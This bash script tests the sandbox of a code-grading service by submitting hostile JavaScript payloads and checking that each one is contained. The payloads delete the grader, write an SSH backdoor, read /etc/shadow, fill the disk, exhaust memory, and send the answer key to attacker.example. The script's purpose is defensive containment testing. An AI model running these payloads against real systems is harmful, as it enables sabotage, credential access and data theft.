#!/usr/bin/env bash
#
# scripts/verify-destructive.sh — destructive-payload containment matrix.
#
# Companion to abuse-demo.sh. Submits a set of *destructive* hostile solutions
# (filesystem destruction, answer-key exfiltration, de-root/host recon, disk
# fill, memory bomb) through the real HTTP API and asserts the hardened
# per-submission Docker sandbox contains every one:
#
#   * the submission ends FAILED/ERROR — NEVER a forged PASS,
#   * the API stays healthy (/health -> 200) the whole time,
#   * no verdict-sub-* container is left behind.
#
# Each payload prints its own outcome to stdout, surfaced below as evidence.
#
# Prereqs: API + Postgres up and seeded (`make dev`). `jq`, `curl`, `docker`
# on PATH. Usage: bash scripts/verify-destructive.sh
# Exit code: 0 if every payload was contained, 1 otherwise.

set -uo pipefail

API_PORT="${API_PORT:-4000}"
API="http://localhost:${API_PORT}"
COOKIE_JAR="$(mktemp)"
trap 'rm -f "$COOKIE_JAR"' EXIT
FAILURES=0

log() { printf '%s\n' "$*"; }

curl -sS --max-time 10 -c "$COOKIE_JAR" -X POST -H 'content-type: application/json' \
  -d '{"email":"student@verdict.dev","password":"password"}' "$API/auth/login" -o /dev/null || {
  log "ERROR: could not log in — is the stack up (make dev)?"; exit 1; }

PROBLEM_ID="$(curl -sS --max-time 10 -b "$COOKIE_JAR" "$API/problems" \
  | jq -r '.[]|select(.title=="Sum of Two Numbers").id')"
[ -n "$PROBLEM_ID" ] && [ "$PROBLEM_ID" != "null" ] || { log "ERROR: seed problem not found"; exit 1; }

# check(name, code) — submit, poll to terminal, assert containment.
check() {
  local name="$1" code="$2" sid status health json
  sid="$(jq -n --arg p "$PROBLEM_ID" --arg c "$code" '{problemId:$p, code:$c}' \
    | curl -sS --max-time 15 -b "$COOKIE_JAR" -X POST -H 'content-type: application/json' \
        -d @- "$API/submissions" | jq -r .id)"
  status=""
  local i
  for i in $(seq 1 40); do
    json="$(curl -sS --max-time 8 -b "$COOKIE_JAR" "$API/submissions/$sid" 2>/dev/null)"
    status="$(printf '%s' "$json" | jq -r .status 2>/dev/null)"
    case "$status" in PASSED|FAILED|ERROR) break;; esac
    sleep 1
  done
  health="$(curl -sS -o /dev/null -w '%{http_code}' --max-time 4 "$API/health")"

  log "───────────────────────────────────────────────────────────────"
  log "PAYLOAD: $name"
  log "  status=$status  api_health_after=$health"
  log "  per-case: $(printf '%s' "$json" | jq -c '[.results[]|{status,timeMs}]' 2>/dev/null)"
  log "  evidence (first visible case stdout):"
  printf '%s' "$json" | jq -r 'first(.results[]|select(.hidden==false)|.stdout) // "(none)"' 2>/dev/null \
    | sed 's/^/      /'

  # Containment = NOT a forged PASS, and the API survived.
  if [ "$status" = "PASSED" ]; then
    log "  ✗ FAIL: payload forged a PASS!"; FAILURES=$((FAILURES + 1))
  elif [ "$health" != "200" ]; then
    log "  ✗ FAIL: API unhealthy after payload (health=$health)"; FAILURES=$((FAILURES + 1))
  else
    log "  ✓ contained"
  fi
}

check "fs_destroy (delete grader / write backdoor)" \
'const fs=require("fs");for(const t of [["unlink /work/harness.js",()=>fs.unlinkSync("/work/harness.js")],["write /work/main.js",()=>fs.writeFileSync("/work/main.js","pwned")],["write /etc/passwd",()=>fs.writeFileSync("/etc/passwd","x")],["write /root backdoor",()=>fs.writeFileSync("/root/.ssh/authorized_keys","k")]]){try{t[1]();console.log(t[0]+": WROTE (BAD!)")}catch(e){console.log(t[0]+": blocked "+e.code)}}'

check "exfil_key (steal answer key over the network)" \
'const fs=require("fs");let m={};try{m=JSON.parse(fs.readFileSync("/work/manifest.json","utf8"))}catch(e){}console.log("perCaseKeys="+(m.cases&&m.cases[0]?Object.keys(m.cases[0]).join(","):"?"));console.log("hasExpectedOutput="+JSON.stringify(m).includes("expectedOutput"));require("http").get("http://attacker.example/steal?d="+encodeURIComponent(JSON.stringify(m)),()=>console.log("exfil: SENT (BAD!)")).on("error",e=>console.log("exfil: blocked "+e.code))'

check "deroot_recon (read host secrets / escalate)" \
'console.log("uid="+process.getuid()+" gid="+process.getgid());try{require("fs").readFileSync("/etc/shadow");console.log("read /etc/shadow (BAD!)")}catch(e){console.log("shadow: blocked "+e.code)}'

check "disk_fill (exhaust the filesystem)" \
'const fs=require("fs");try{const fd=fs.openSync("/tmp/x","w");const b=Buffer.alloc(1024*1024);for(let i=0;i<128;i++)fs.writeSync(fd,b);console.log("wrote 128MB (BAD!)")}catch(e){console.log("disk: blocked "+e.code)}'

check "mem_bomb (exhaust host memory)" \
'const a=[];try{for(;;){a.push(Buffer.alloc(10*1024*1024))}}catch(e){console.log("mem: "+e.message.slice(0,40))}'

log "═══════════════════════════════════════════════════════════════"
leftover="$(docker ps --format '{{.Names}}' 2>/dev/null | grep verdict-sub || true)"
log "final api health : $(curl -sS --max-time 4 "$API/health")"
log "leftover containers: ${leftover:-none}"
[ -z "$leftover" ] || FAILURES=$((FAILURES + 1))

if [ "$FAILURES" -eq 0 ]; then
  log "✓ ALL DESTRUCTIVE PAYLOADS CONTAINED"
  exit 0
else
  log "✗ $FAILURES CHECK(S) FAILED"
  exit 1
fi
